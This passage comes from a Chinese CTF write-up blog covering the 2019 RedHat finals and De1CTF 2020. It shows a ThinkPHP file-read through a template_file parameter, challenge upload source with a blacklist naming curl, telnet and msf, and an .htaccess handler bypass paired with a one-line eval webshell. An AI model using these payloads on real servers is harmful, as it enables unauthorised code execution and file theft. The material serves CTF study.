模板文件不存在直接返回</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string">'_TEMPLATE_NOT_EXIST_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">'THEME_PATH'</span><span class="token punctuation">)</span> <span class="token keyword">or</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'THEME_PATH'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getThemePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 页面缓存</span>        <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 使用PHP原生模板</span>            <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 模板阵列变量分解成为独立变量</span>            <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 直接载入PHP模板</span>            <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'?>'</span><span class="token punctuation">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 视图解析标签</span>            <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'var'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string">'content'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 获取并清空缓存</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 内容过滤标签</span>        Hook<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 输出模板文件</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将/flag直接作为模板进行渲染，/index.php/Jquery/index?template_file=/flag</p><h5 id="问题-1：渲染模板的原理是什么？"><a href="#问题-1：渲染模板的原理是什么？" class="headerlink" title="问题:1：渲染模板的原理是什么？"></a>问题:1：渲染模板的原理是什么？</h5><h5 id="问题2：这里的路由也不明白怎么找的？"><a href="#问题2：这里的路由也不明白怎么找的？" class="headerlink" title="问题2：这里的路由也不明白怎么找的？"></a>问题2：这里的路由也不明白怎么找的？</h5><p><img src="/2020/05/04/2019-redhat/touzi5.png" alt="路由"></p><h5 id="问题3：修补方案不理解？"><a href="#问题3：修补方案不理解？" class="headerlink" title="问题3：修补方案不理解？"></a>问题3：修补方案不理解？</h5><p>判断<code>$_GET[&#39;template_file&#39;]</code>的路径是不是在模板文件夹的目录下（模板文件夹在哪里？？？）。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#  判断指定文件夹下是否存在指定文件</span><span class="token keyword">function</span> <span class="token function">dir_exist_file</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// echo $value;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">===</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">dir_exist_file</span><span class="token punctuation">(</span><span class="token string">"c:\\"</span><span class="token punctuation">,</span><span class="token string">"Users"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token shell-comment comment">#  $path放模板文件夹所在位置，$filename即为$template_file</span>    <span class="token keyword">echo</span> <span class="token string">"file exists!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2-粤湾租赁"><a href="#2-2-粤湾租赁" class="headerlink" title="2.2  粤湾租赁"></a>2.2  粤湾租赁</h2><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><h3 id="First："><a href="#First：" class="headerlink" title="First："></a>First：</h3><p>将代码拖到sublime，find in folder下列内容：</p><pre><code>/etc/passwdflagupload</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong>1、</strong>官方writeup：</p><p><a href="https://mp.weixin.qq.com/s/7DBMDr85_nBCjBkQoqlOWQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/7DBMDr85_nBCjBkQoqlOWQ</a></p><p><strong>2、</strong>详细writeup：</p><p><a href="https://xz.aliyun.com/t/6826#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6826#toc-1</a></p><p><a href="https://threezh1.com/2019/12/18/2019%20Redhat%E5%86%B3%E8%B5%9B%20Writeup/" target="_blank" rel="noopener">https://threezh1.com/2019/12/18/2019%20Redhat%E5%86%B3%E8%B5%9B%20Writeup/</a></p><p><a href="https://lihuaiqiu.github.io/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_contest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020--XCTF</title>
      <link href="/2020/05/02/2020-xctf/"/>
      <url>/2020/05/02/2020-xctf/</url>
      
        <content type="html"><![CDATA[<h1 id="De1CTF-2020"><a href="#De1CTF-2020" class="headerlink" title="De1CTF 2020"></a>De1CTF 2020</h1><h1 id="1-check-in"><a href="#1-check-in" class="headerlink" title="1. check in"></a>1. check in</h1><p><strong>链接：</strong> <a href="http://129.204.21.115" target="_blank" rel="noopener">http://129.204.21.115</a> </p><p><strong>考点：</strong>.htaccess实现文件上传</p><p><strong>参考资料：</strong></p><p><strong>1、</strong> 利用htaccess绕黑名单，mail绕过disable function  <a href="https://xz.aliyun.com/t/3937" target="_blank" rel="noopener">https://xz.aliyun.com/t/3937</a></p><p><strong>2、</strong>.htaccess tricks总结   <a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11741348.html</a> </p><p><strong>3、</strong>[SUCTF 2019]CheckIn  <a href="https://www.jianshu.com/p/2907426b4a91" target="_blank" rel="noopener">https://www.jianshu.com/p/2907426b4a91</a></p><p><strong>4、</strong>各种一句话木马大全  <a href="https://blog.csdn.net/l1028386804/article/details/84206143" target="_blank" rel="noopener">https://blog.csdn.net/l1028386804/article/details/84206143</a></p><p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Cheek in<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style/css/style1.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style/css/style2.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$typeAccepted</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"image/jpeg"</span><span class="token punctuation">,</span> <span class="token string">"image/gif"</span><span class="token punctuation">,</span> <span class="token string">"image/png"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$black</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$result1</span> <span class="token operator">=</span><span class="token string">"???"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$result1</span> <span class="token operator">=</span><span class="token string">"filename cannot be empty!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph|ml|js|cg/i"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token string">"filename error"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$typeAccepted</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token string">'filetype error'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet/i"</span><span class="token punctuation">,</span><span class="token variable">$black</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token string">"perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x "</span><span class="token punctuation">.</span><span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result2</span><span class="token operator">=</span> <span class="token string">"Your dir : "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span> <span class="token string">' &lt;br>'</span><span class="token punctuation">;</span>        <span class="token variable">$result3</span><span class="token operator">=</span> <span class="token string">"Your files :"</span> <span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token string">'upload your file'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wrap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token property">text-align</span><span class="token punctuation">:</span> center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token constant">UPLOADS</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wd<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fileUpload<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wd<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>change_link<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span> center</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路：</strong></p><p>看到文件名和内容过滤了php、auto、&gt;，就想到用.htaccess，</p><pre class="line-numbers language-php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>p\hp <span class="token punctuation">.</span>wuwu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一句话用一个短标签的，绕过&gt;</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="2-Hard-Pentest-1"><a href="#2-Hard-Pentest-1" class="headerlink" title="2. Hard_Pentest_1"></a>2. Hard_Pentest_1</h1><p><strong>链接：</strong> <a href="http://47.113.219.76/" target="_blank" rel="noopener">http://47.113.219.76/</a> </p><p><strong>考点：</strong>文件上传</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>【PHP-CTF】无字母无数字webshell  <a href="https://blog.csdn.net/a15803617402/article/details/83589181" target="_blank" rel="noopener">https://blog.csdn.net/a15803617402/article/details/83589181</a></p><p><strong>2、</strong>一些不包含数字和字母的webshell  <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><strong>3、</strong>CTF 中的 PHP 知识汇总   <a href="https://www.restran.net/2016/09/26/php-security-notes/" target="_blank" rel="noopener">https://www.restran.net/2016/09/26/php-security-notes/</a> </p><p><strong>4、</strong><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//Clear the uploads directory every hour</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span><span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"De1CTF2020"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token 